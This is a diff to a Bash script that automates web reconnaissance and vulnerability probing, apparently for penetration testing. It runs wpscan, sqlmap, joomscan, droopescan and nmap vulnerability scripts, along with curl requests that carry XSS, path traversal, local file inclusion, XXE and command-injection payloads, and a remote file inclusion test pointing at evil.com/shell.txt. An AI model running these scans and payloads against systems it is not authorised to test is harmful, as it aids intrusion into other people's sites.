@@ -10,7 +10,7 @@ validate_url() {
 
 # Function to check if required tools are installed
 check_tools() {
-    required_tools=(whois dnsrecon whatweb nc wpscan sqlmap curl nmap sslscan nrich dig)
+    required_tools=(whois dnsrecon whatweb nc wpscan sqlmap curl nmap sslscan nrich dig joomscan droopescan)
     for tool in "${required_tools[@]}"; do
         if ! command -v $tool &> /dev/null; then
             echo "$tool is not installed. Please install it before running the script."
@@ -52,79 +52,147 @@ main() {
 
     # WHOIS lookup for domain information
     echo "Running WHOIS lookup..."
+    echo "whois \"$domain\""
     whois "$domain"
+    echo -e "\n\n"
 
     # DNS reconnaissance
     echo "Running DNS reconnaissance..."
+    echo "dnsrecon -d \"$domain\""
     dnsrecon -d "$domain"
+    echo -e "\n\n"
 
     # Identify technologies used on the website
     echo "Identifying technologies used on the website..."
+    echo "whatweb \"$url\""
     whatweb "$url"
+    echo -e "\n\n"
+
+    # Apache enumeration
+    echo "Running Apache enumeration..."
+    echo "nmap --script http-apache-server-status \"$host\""
+    nmap --script http-apache-server-status "$host"
+    echo -e "\n\n"
+
+    # Nginx enumeration
+    echo "Running Nginx enumeration..."
+    echo "nmap --script http-nginx-server-status \"$host\""
+    nmap --script http-nginx-server-status "$host"
+    echo -e "\n\n"
+
+    # IIS enumeration
+    echo "Running IIS enumeration..."
+    echo "nmap --script http-iis-webdav-vuln \"$host\""
+    nmap --script http-iis-webdav-vuln "$host"
+    echo -e "\n\n"
 
     # Check MSSQL, MySQL or MariaDB database version
     echo "Checking MSSQL, MySQL or MariaDB database version..."
+    echo "nmap -p 1433,3306 --script ms-sql-info,mysql-info \"$host\""
     nmap -p 1433,3306 --script ms-sql-info,mysql-info "$host"
+    echo -e "\n\n"
 
     # Wordpress vulnerability scan
     echo "Running Wordpress vulnerability scan..."
+    echo "wpscan --stealthy --url \"$url\""
     wpscan --stealthy --url "$url"
+    echo -e "\n\n"
+
+    # Joomla vulnerability scan
+    echo "Running Joomla vulnerability scan..."
+    echo "joomscan --url \"$url\""
+    joomscan --url "$url"
+    echo -e "\n\n"
+
+    # Drupal vulnerability scan
+    echo "Running Drupal vulnerability scan..."
+    echo "droopescan scan drupal -u \"$url\""
+    droopescan scan drupal -u "$url"
+    echo -e "\n\n"
 
     # SQL Injection test
     echo "Running SQL Injection test..."
+    echo "sqlmap -u \"$url\" --batch --dbs"
     sqlmap -u "$url" --batch --dbs
+    echo -e "\n\n"
 
     # XSS test
     echo "Running XSS test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" -d \"<script>alert(1)</script>\" \"$url\""
     curl -s -o /dev/null -w "%{http_code}" -d "<script>alert(1)</script>" "$url"
+    echo -e "\n\n"
 
     # CSRF test
     echo "Running CSRF test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" -X POST -d \"param=value\" \"$url\""
     curl -s -o /dev/null -w "%{http_code}" -X POST -d "param=value" "$url"
+    echo -e "\n\n"
 
     # Directory traversal test
     echo "Running Directory traversal test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" \"$url/../../etc/passwd\""
     curl -s -o /dev/null -w "%{http_code}" "$url/../../etc/passwd"
+    echo -e "\n\n"
 
     # Command injection test
     echo "Running Command injection test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" \"$url?cmd=ls\""
     curl -s -o /dev/null -w "%{http_code}" "$url?cmd=ls"
+    echo -e "\n\n"
 
     # Host header injection test
     echo "Running Host header injection test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" -H \"Host: malicious.example.com\" \"$url\""
     curl -s -o /dev/null -w "%{http_code}" -H "Host: malicious.example.com" "$url"
+    echo -e "\n\n"
 
     # Path traversal test
     echo "Running Path traversal test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" \"$url/../../../../etc/passwd\""
     curl -s -o /dev/null -w "%{http_code}" "$url/../../../../etc/passwd"
+    echo -e "\n\n"
 
     # Local File Inclusion (LFI) test
     echo "Running Local File Inclusion (LFI) test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" \"$url?file=../../../../etc/passwd\""
     curl -s -o /dev/null -w "%{http_code}" "$url?file=../../../../etc/passwd"
+    echo -e "\n\n"
 
     # Remote File Inclusion (RFI) test
     echo "Running Remote File Inclusion (RFI) test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" \"$url?file=http://evil.com/shell.txt\""
     curl -s -o /dev/null -w "%{http_code}" "$url?file=http://evil.com/shell.txt"
+    echo -e "\n\n"
 
     # XML External Entity (XXE) test
     echo "Running XML External Entity (XXE) test..."
+    echo "curl -s -o /dev/null -w \"%{http_code}\" -d '<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>' \"$url\""
     curl -s -o /dev/null -w "%{http_code}" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>' "$url"
+    echo -e "\n\n"
 
     # SSL/TLS scan
     echo "Running SSL/TLS scan..."
+    echo "sslscan \"$host\""
     sslscan "$host"
+    echo -e "\n\n"
 
     # Basic Nmap scan
     echo "Running basic Nmap scan..."
+    echo "sudo nmap \"$host\""
     sudo nmap "$host"
+    echo -e "\n\n"
 
     # Comprehensive Nmap scan with vulnerability scripts
     echo "Running comprehensive Nmap scan with vulnerability scripts..."
+    echo "sudo nmap -sV -sC --script vuln* -O \"$host\""
     sudo nmap -sV -sC --script vuln* -O "$host"
+    echo -e "\n\n"
 
     # Shodan scan
     echo "Running Shodan scan..."
+    echo "echo \"$ipv4\" | nrich -"
     echo "$ipv4" | nrich -
+    echo -e "\n\n"
 }
 
 # Execute main function
